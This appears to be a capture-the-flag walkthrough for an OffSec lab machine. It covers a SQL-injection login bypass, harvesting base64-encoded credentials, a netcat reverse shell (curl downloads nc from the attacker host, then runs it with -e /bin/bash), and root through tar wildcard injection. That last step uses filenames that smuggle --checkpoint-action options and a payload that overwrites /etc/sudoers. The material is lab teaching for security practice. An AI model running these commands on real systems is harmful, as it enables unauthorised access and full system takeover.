An explanation of how we get our initial foothold via auth bypass to harvest credentials and got us terminal access. Privilege escalation is related to the user able to run certain file as sudo.

# Enumeration

nmap -p- $ip -Pn -sT  -v -A --open -T 4 -oN nmap.txt

Got port 22, 80 and 9090.

## Explore Port 80

Browse the page, an amazing product awaits you =D the button is not function. We did a `dirsearch -u [http://$ip](http://$ip) -r -o dirsearch.txt`, found a `login.php` page. Go to the page, we discover the domain `blaze.offsec`, add the domain to `/etc/hosts` file, run again `dirsearch` with the domain, and browse the page using `[http://blaze.offsec/login.php](http://blaze.offsec/login.php,)`[,](http://blaze.offsec/login.php,) looks the same to me.

![](https://miro.medium.com/v2/resize:fit:700/1*S83vnx1InIKyl7mz3lbPhA.png)

login.php page

Try google “blaze by JDgodd” but nothing useful info return. Try some default passwords like admin:admin, admin:password but got no luck here.

## Interesting error message discovered

Next, we want to try if we can bypass the authentication. I try adding single quote ‘ to the username. It return MySQL error.

![](https://miro.medium.com/v2/resize:fit:420/1*cEOXC_qYwz7QZjAc6TMpdQ.png)

MySQL error

Great, we might be able to bypass the auth. We google “mysql login bypass seclist”, get the payload and try to enter in username.

Make sure to check seclists!!
![[Pasted image 20240102092907.png]]


](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt?source=post_page-----c95930e9523d--------------------------------)

It works ! we managed to bypass authentication and login to the dashboard.

## Harvest credential

From the dashboard, we got 2 credentials, james and cameron.

![](https://miro.medium.com/v2/resize:fit:700/1*orR65tvMLLnFIQwzVq2CJw.png)

Credential found

We then `echo '$TheEncodedPassword' | base64 -d > pass.txt` to decode the password. Now we got 2 credentials, we try to ssh to the remote machine with these credentials however return error as permission denied.

## Port 9090 Initial Foothold

Move on to port 9090, an ubuntu page, we manage to log in using james credentials. From the home page, we found a terminal page that allows us to execute commands, great!

![](https://miro.medium.com/v2/resize:fit:700/1*L6dZNGF0KcvNsk4n_qIeXA.png)

Terminal function found

We setup netcat listener on kali machine, then run `nc $kaliIP $port -e /bin/bash`, however, the netcat does not support -e function, totally fine. We upload our own nc to the target machine.

```c
#start simple http server at where nc locate at kali machine, usually at /usr/bin  
python3 -m http.server 80  
#at james terminal  
curl http://$kaliIP/nc -o /tmp/nc  
chmod +x /tmp/nc  
#start nc listener at kali  
nc -nlvp 80  
#go back james execute nc  
/tmp/nc $kaliIP 80 -e /bin/bash
```

![](https://miro.medium.com/v2/resize:fit:559/1*a18iyihs30A43pZGk9h7Rw.png)

Got our first flag =)

# Privilege Escalation

Once we get our first flag, check `sudo -l` (remember we got james password), we found we can run sudo for tar with ***(wildcard)** at the end.

![](https://miro.medium.com/v2/resize:fit:573/1*5TFoRumHSmoB2U2pO-xvjA.png)

sudo -l

This is interesting, by googling “sudo tar privilege escalation”, we found a medium article from

[Ben Folland](https://medium.com/u/d2de97a6005d?source=post_page-----c95930e9523d--------------------------------)

that showed a guide on how we can get root with tar and *. Also, GTFObin has a similar guide as well.

## Linux Privilege Escalation: Wildcards with tar

### I recently discovered a creative and unique Linux privilege escalation vector that exploits they way the wildcard…

medium.com



](https://medium.com/@cybenfolland/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa?source=post_page-----c95930e9523d--------------------------------)

[

## tar | GTFOBins

### It can be used to break out from restricted environments by spawning an interactive system shell. tar -cf /dev/null…

gtfobins.github.io

](https://gtfobins.github.io/gtfobins/tar/?source=post_page-----c95930e9523d--------------------------------)

> A quick explanation here,
> 
> `/usr/bin/tar -czvf /tmp/backup.tar.gz *` means compress all files into backup.tar.gz
> 
> `tar` has a feature where it can be instructed to run a command (`--checkpoint-action`) when it reaches a certain point in its process (`--checkpoint`). For example --checkpoint=1; --checkpoint-action=exec=/bin/sh
> 
> So, if we create 2 file, the first file name ‘--checkpoint=1’ , the second file name ‘--checkpoint-action=exec=sh payload.sh’ . When we execute the tar command, it will execute as `sudo /usr/bin/tar -czvf /tmp/backup.tar.gz a.txt b.txt --checkpoint=1 --checkpoint-action=exec=sh payload.sh`with root permission.

The reason we don’t use checkpoint-action=exec=/bin/sh is because of the special character / and the reason we need 2 file is because of space between file name if we only going to create 1 file.

The shell interprets spaces as delimiters between arguments and interprets the `/` character as a directory separator. When using `echo "" > filename`, if `filename` contains spaces without being quoted or if it contains `/`, it can lead to unexpected behaviors or errors.

So in short,

```c
#at target machine, create 2 files  
echo "" > '--checkpoint=1'  
echo "" > '--checkpoint-action=exec=sh payload.sh'  
#then create a payload.sh with below content, you can create on your kali machine and transfer to target machine.  
echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers  
chmod +x payload.sh  
#execute the tar  
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

After that, `sudo -l` to check if we run anything as root without password.

![](https://miro.medium.com/v2/resize:fit:471/1*SHlK8J3dFaZgEhKzwNFcJw.png)

Root!